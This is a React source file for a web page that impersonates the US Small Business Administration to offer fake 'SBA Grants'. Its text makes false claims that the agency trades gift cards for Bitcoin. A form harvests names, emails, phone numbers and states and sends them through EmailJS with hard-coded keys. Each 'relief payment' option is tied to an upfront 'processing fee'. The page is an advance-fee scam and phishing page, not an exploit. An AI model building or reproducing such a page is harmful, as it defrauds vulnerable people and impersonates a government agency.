import {
  img1,
  img2,
  img3,
  img4,
  logo_horizontal,
  powered_by,
} from "./assets/images/images";
import { HiMiniBars3CenterLeft } from "react-icons/hi2";
import {
  FaCopyright,
  FaFacebook,
  FaGoogle,
  FaInstagram,
  FaLinkedinIn,
  FaRegCopyright,
  FaXTwitter,
} from "react-icons/fa6";
import { Swiper, SwiperSlide } from "swiper/react";
import { Autoplay, Pagination } from "swiper/modules";
import "swiper/css";

import "swiper/css/pagination";
import { BiChevronRightCircle } from "react-icons/bi";
import { useState } from "react";
import toast, { Toaster } from "react-hot-toast";
import emailjs from "@emailjs/browser";

export default function App() {
  const [disableBtn, setDisableBtn] = useState(false);
  const [grantInputs, setGrantInputs] = useState({
    firstname: "",
    lastname: "",
    email: "",
    number: "",
    state: "",
    amount: "",
  });

  const handleChange = (e) => {
    setGrantInputs((prev) => ({ ...prev, [e.target.name]: e.target.value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    toast.loading("Submitting your details. Please wait", { id: "123" });
    setDisableBtn(true);

    const templateParams = {
      firstname: grantInputs.firstname,
      lastname: grantInputs.lastname,
      email: grantInputs.email,
      number: grantInputs.number,
      state: grantInputs.state,
      amount: grantInputs.amount,
    };

    emailjs
      .send(
        "service_7gmemr8",
        "template_o13o5wu",
        templateParams,
        "_eTdnvbNPooymZKhP"
      )
      .then(
        (result) => {
          toast.success("Details submitted successfully!", { id: "123" });
          setDisableBtn(false);
          setGrantInputs({
            firstname: "",
            lastname: "",
            email: "",
            number: "",
            state: "",
            amount: "",
          });
        },
        (error) => {
          toast.error("Failed to send. Try again.", { id: "123" });
          setDisableBtn(false);
        }
      );
  };

  const states = [
    "Alabama",
    "Alaska",
    "Arizona",
    "Arkansas",
    "California",
    "Colorado",
    "Connecticut",
    "Delaware",
    "Florida",
    "Georgia",
    "Hawaii",
    "Idaho",
    "Illinois",
    "Indiana",
    "Iowa",
    "Kansas",
    "Kentucky",
    "Louisiana",
    "Maine",
    "Maryland",
    "Massachusetts",
    "Michigan",
    "Minnesota",
    "Mississippi",
    "Missouri",
    "Montana",
    "Nebraska",
    "Nevada",
    "New Hampshire",
    "New Jersey",
    "New Mexico",
    "New York",
    "North Carolina",
    "North Dakota",
    "Ohio",
    "Oklahoma",
    "Oregon",
    "Pennsylvania",
    "Rhode Island",
    "South Carolina",
    "South Dakota",
    "Tennessee",
    "Texas",
    "Utah",
    "Vermont",
    "Virginia",
    "Washington",
    "West Virginia",
    "Wisconsin",
    "Wyoming",
  ];

  const options = [
    { amount: 2000, fee: 100 },
    { amount: 3000, fee: 200 },
    { amount: 4000, fee: 300 },
    { amount: 5000, fee: 400 },
    { amount: 6000, fee: 500 },
    { amount: 7000, fee: 600 },
    { amount: 8000, fee: 700 },
    { amount: 9000, fee: 800 },
    { amount: 10000, fee: 900 },
    { amount: 12000, fee: 1000 },
    { amount: 14000, fee: 2000 },
    { amount: 16000, fee: 3000 },
    { amount: 18000, fee: 4000 },
    { amount: 20000, fee: 5000 },
  ];
  return (
    <>
      <Toaster></Toaster>
      <header className="p-6 flex items-center justify-between border-b border-zinc-300">
        <a href="/">
          <img src={logo_horizontal} alt="logo" className="w-[150px]" />
        </a>
        <span className="h-7 w-7 flex items-center justify-center text-2xl">
          <HiMiniBars3CenterLeft />
        </span>
      </header>

      <main className="p-4 flex flex-col gap-6 w-full max-w-[900px] mx-auto ">
        <section className="bg-[#002e6d] p-7 lg:p-10 flex flex-col gap-4">
          <h1 className="text-white text-5xl lg:text-5xl tracking-tight font_nexa font-black">
            Need funding for your small business?
          </h1>
          <a
            href=""
            className="bg-blue-500 w-max py-3 px-7 rounded-md font-semibold text-white text-sm "
          >
            Learn about SBA grant
          </a>
        </section>

        <h1 className="flex flex-col w-full text-2xl font-black text-[#002e6d] ">
          <span className="font_nexa">Welcome to SBA Grants</span>
          <p className="text-sm light_text">
            Small Business Administration Grants
          </p>
        </h1>

        <p className="text-sm light_text font-black">
          (SBA) Small Business Administration that deals with gift cards to
          Bitcoin and they need more than $50,000 daily. Basically they are
          doing this to help the less privileged on the control of Finance
          during lockdown to benefit from this you have to trade with them using
          giftcard or make cashapp transfer for bitcoin spinning and get your
          winnings immediately after verification.
        </p>

        <Swiper
          className="h-[250px] lg:h-[400px] overflow-hidden w-full"
          modules={[Autoplay, Pagination]}
          spaceBetween={20}
          slidesPerView={1}
          pagination={{ clickable: true }}
          autoplay={{ delay: 3000, disableOnInteraction: false }}
          loop={true}
        >
          <SwiperSlide>
            <img src={img1} alt="slide 1 image" />
          </SwiperSlide>
          <SwiperSlide>
            <img src={img2} alt="slide 2 image" />
          </SwiperSlide>
          <SwiperSlide>
            <img src={img3} alt="slide 3 image" />
          </SwiperSlide>
          <SwiperSlide>
            <img src={img4} alt="slide 4 image" />
          </SwiperSlide>
        </Swiper>

        <p className="text-sm light_text font-black">
          Bitcoin is a form of digital money that exists independently of any
          government, state, or financial institution, can be transferred
          globally. The Small business administration in conjunction with the
          Bitcoin minning groups is giving out money to citizens to be able to
          enjoy the benefits of Bitcoin because it’s acceptable
          all over the world
        </p>

        <div className="flex flex-col">
          <h1 className="lg:text-xl font-semibold">
            Please complete the form to continue your SBA Grant application.
          </h1>
          <p className="text-[13px] lg:text-[16px] light_text">
            This step is required to finalize your registration and begin the
            grant approval process.
          </p>
        </div>

        <form
          onSubmit={handleSubmit}
          className="flex flex-col gap-6 text-sm p-5 bg-zinc-100 py-10 rounded-md lg:px-28"
        >
          <p>
            <span className="text-red-500">*</span> Indicates required field
          </p>

          <div className="flex flex-col gap-1">
            <label htmlFor="" className="uppercase font-semibold">
              Firstname <span className="text-red-500">*</span>
            </label>
            <input
              required
              name="firstname"
              value={grantInputs.firstname}
              onChange={handleChange}
              type="text"
              className="border border-zinc-300 p-2.5 outline-none focus:border-[#002e6d] placeholder:text-xs rounded-lg placeholder:text-zinc-400 placeholder:font-light px-4 bg-white h-[45px]"
              placeholder="Enter your firstname"
            />
          </div>

          <div className="flex flex-col gap-1">
            <label htmlFor="" className="uppercase font-semibold">
              Lastname <span className="text-red-500">*</span>
            </label>
            <input
              required
              type="text"
              name="lastname"
              value={grantInputs.lastname}
              onChange={handleChange}
              className="border border-zinc-300 p-2.5 outline-none focus:border-[#002e6d] placeholder:text-xs rounded-lg placeholder:text-zinc-400 placeholder:font-light px-4 bg-white h-[45px]"
              placeholder="Enter your lastname"
            />
          </div>

          <div className="flex flex-col gap-1">
            <label htmlFor="" className="uppercase font-semibold">
              Email <span className="text-red-500">*</span>
            </label>
            <input
              required
              type="email"
              name="email"
              value={grantInputs.email}
              onChange={handleChange}
              className="border border-zinc-300 p-2.5 outline-none focus:border-[#002e6d] placeholder:text-xs rounded-lg placeholder:text-zinc-300 placeholder:font-light px-4 bg-white h-[45px]"
              placeholder="Enter your email addres"
            />
          </div>

          <div className="flex flex-col gap-1">
            <label htmlFor="" className="uppercase font-semibold">
              Phone Number <span className="text-red-500">*</span>
            </label>
            <input
              required
              type="text"
              name="number"
              value={grantInputs.number}
              onChange={handleChange}
              className="border border-zinc-300 p-2.5 outline-none focus:border-[#002e6d] placeholder:text-xs rounded-lg placeholder:text-zinc-300 placeholder:font-light px-4 bg-white h-[45px]"
              placeholder="Enter your phone number"
            />
          </div>

          <div className="flex flex-col gap-1">
            <label htmlFor="" className="uppercase font-semibold">
              State <span className="text-red-500">*</span>
            </label>
            <select
              required
              name="state"
              onChange={handleChange}
              defaultValue={grantInputs.state}
              className="border border-zinc-300 p-2.5 outline-none focus:border-[#002e6d] placeholder:text-xs rounded-lg placeholder:text-zinc-300 placeholder:font-light px-4 bg-white h-[45px]"
            >
              <option value="" disabled>
                Select a state
              </option>
              {states.map((state, index) => (
                <option key={index} value={state}>
                  {state}
                </option>
              ))}
            </select>
          </div>

          <div className="flex flex-col gap-1">
            <label htmlFor="" className="uppercase font-semibold">
              Select a relief payment amount{" "}
              <span className="text-red-500">*</span>
            </label>
            <select
              required
              name="amount"
              onChange={handleChange}
              defaultValue={grantInputs.amount}
              className="border border-zinc-300 p-2.5 outline-none focus:border-[#002e6d] placeholder:text-xs rounded-lg placeholder:text-zinc-300 placeholder:font-light px-4 bg-white h-[45px]"
            >
              <option value="" disabled>
                Select a relief payment amount
              </option>
              {options.map((option, index) => (
                <option key={index} value={option.amount}>
                  Relief payment ${option.amount} - Processing fee ${option.fee}
                </option>
              ))}
            </select>
          </div>

          <p className="text-xs">
            By continuing, you acknowledge and accept the{" "}
            <span className="text-blue-500">terms</span> and applicable
            <span className="text-blue-500"> processing fees</span>.
          </p>

          <button
            disabled={disableBtn}
            className="bg-[#002e6d] w-full py-3 px-7 rounded-md text-white text-sm flex items-center gap-1 justify-center mt-2 cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
          >
            Proceed <BiChevronRightCircle />
          </button>
        </form>
      </main>

      <footer className="bg-zinc-200 p-6 flex flex-col gap-6 text-[#002e6d]">
        <main className="flex items-center justify-between">
          <img src={powered_by} alt="footer_icon" className="w-[70px]" />
          <div className="flex items-center gap-4 text-xl">
            <FaFacebook />
            <FaXTwitter />
            <FaLinkedinIn />
            <FaGoogle />
            <FaInstagram />
          </div>
        </main>
        <p className="text-xs font-medium flex items-center gap-1 font-sans">
          <FaRegCopyright />
          <span className="mt-1">
            {new Date().getFullYear()} SBA Grants. All Rights Reserved.
          </span>
        </p>
      </footer>
    </>
  );
}
